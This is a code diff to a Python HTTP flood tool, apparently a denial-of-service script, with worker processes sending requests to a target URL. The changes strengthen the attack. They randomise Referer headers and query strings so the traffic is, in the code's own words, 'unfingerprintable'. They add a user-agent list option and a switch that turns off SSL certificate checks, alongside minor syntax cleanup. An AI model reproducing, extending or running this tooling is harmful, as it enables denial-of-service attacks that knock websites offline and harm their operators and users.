@@ -126,9 +126,9 @@ class Js(object):
                         worker.join(JOIN_TIMEOUT)
                     else:
                         self.workersQueue.remove(worker)
-                        
+
                 self.stats()
-                
+
             except (KeyboardInterrupt, SystemExit):
                 print("CTRL+C received. Killing all workers")
                 for worker in self.workersQueue:
@@ -137,13 +137,14 @@ class Js(object):
                             print("Killing worker {0}".format(worker.name))
                         #worker.terminate()
                         worker.stop()
-                    except (Exception, ex):
+                    except Exception:
                         pass # silently ignore
                 if DEBUG:
                     raise
                 else:
                     pass
 
+    
 ####
 # Laser Class
 ####
@@ -359,7 +360,7 @@ class Laser(Process):
         }
     
         # Randomly-added headers
-        # These headers are optional and are 
+        # These headers are optional and are
         # randomly sent thus making the
         # header count random and unfingerprintable
         if random.randrange(2) == 0:
@@ -370,7 +371,14 @@ class Laser(Process):
 
         if random.randrange(2) == 0:
             # Random Referer
-            http_headers['Referer'] = random.choice(self.referers) + self.buildblock(random.randint(5,10))
+            url_part = self.buildblock(random.randint(5,10))
+
+            random_referer = random.choice(self.referers) + url_part
+
+            if random.randrange(2) == 0:
+                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))
+
+            http_headers['Referer'] = random_referer
 
         if random.randrange(2) == 0:
             # Random Content-Trype
@@ -386,20 +394,21 @@ class Laser(Process):
     def stop(self):
         self.runnable = False
         self.closeConnections()
+        self.terminate()
 
     # Counter Functions
     def incCounter(self):
         try:
             self.counter[0] += 1
-        except (Exception):
+        except Exception:
             pass
 
     def incFailed(self):
         try:
             self.counter[1] += 1
-        except (Exception):
+        except Exception:
             pass
-        
+
 
 
 ####
@@ -407,7 +416,6 @@ class Laser(Process):
 ####
 # Other Functions
 ####
-
 def usage():
     print("""
     -----------------------------------------------------------------------------------------------------------
@@ -422,7 +430,7 @@ def usage():
      \t -h, --help\t\tShows this help
      -----------------------------------------------------------------------------------------------------------
      """)
-    
+
 def error(msg):
     # print help information and exit:
     sys.stderr.write(str(msg+"\n"))
@@ -434,7 +442,7 @@ def error(msg):
 ####
 
 def main():
-    
+
     try:
 
         if len(sys.argv) < 2:
@@ -452,16 +460,21 @@ def main():
         if url == None:
             error("No URL supplied")
 
-        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:", ["debug", "help", "workers", "sockets", "method" ])
+        opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents" ])
 
         workers = DEFAULT_WORKERS
         socks = DEFAULT_SOCKETS
         method = METHOD_GET
 
+        uas_file = None
+        useragents = []
+
         for o, a in opts:
             if o in ("-h", "--help"):
                 usage()
                 sys.exit()
+            elif o in ("-u", "--useragents"):
+                uas_file = a
             elif o in ("-s", "--sockets"):
                 socks = int(a)
             elif o in ("-w", "--workers"):
@@ -469,6 +482,9 @@ def main():
             elif o in ("-d", "--debug"):
                 global DEBUG
                 DEBUG = True
+            elif o in ("-n", "--nosslcheck"):
+                global SSLVERIFY
+                SSLVERIFY = False
             elif o in ("-m", "--method"):
                 if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                     method = a
@@ -477,6 +493,14 @@ def main():
             else:
                 error("option '"+o+"' doesn't exists")
 
+
+        if uas_file:
+            try:
+                with open(uas_file) as f:
+                    useragents = f.readlines()
+            except EnvironmentError:
+                error("cannot read file {0}".format(uas_file))
+        
         jalsu = Js (url)
         jalsu.nr_workers = workers
         jalsu.method = method
@@ -484,7 +508,7 @@ def main():
 
         jalsu.fire()
 
-    except (getopt.GetoptError):
+    except getopt.GetoptError as err:
 
         # print help information and exit:
         sys.stderr.write(str(err))
